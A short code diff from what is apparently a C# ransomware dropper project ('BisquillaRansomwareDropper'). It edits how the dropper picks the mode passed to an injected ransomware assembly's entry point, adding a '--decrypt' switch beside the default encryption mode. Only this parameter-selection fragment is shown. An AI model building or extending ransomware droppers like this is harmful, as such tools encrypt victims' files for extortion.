@@ -54,7 +54,7 @@ namespace BisquillaRansomwareDropper
             String targetDotNetAssemblyPath = ransomwareFilePath;
             String targetDotNetAssemblyEntryPointAssemblyType = "BisquillaRansomware.Program";
             String targetDotNetAssemblyEntryPointMethodName = "EntryPoint";
-            String targetDotNetAssemblyEntryPointMethodParameters = "E"; // Encryption
+            String targetDotNetAssemblyEntryPointMethodParameters = (args.Length == 1 && args[0] == "--decrypt") ? "D": "E"; // Encryption
 
             // Find the Process Info
             Int32 targetProcessId = 0;
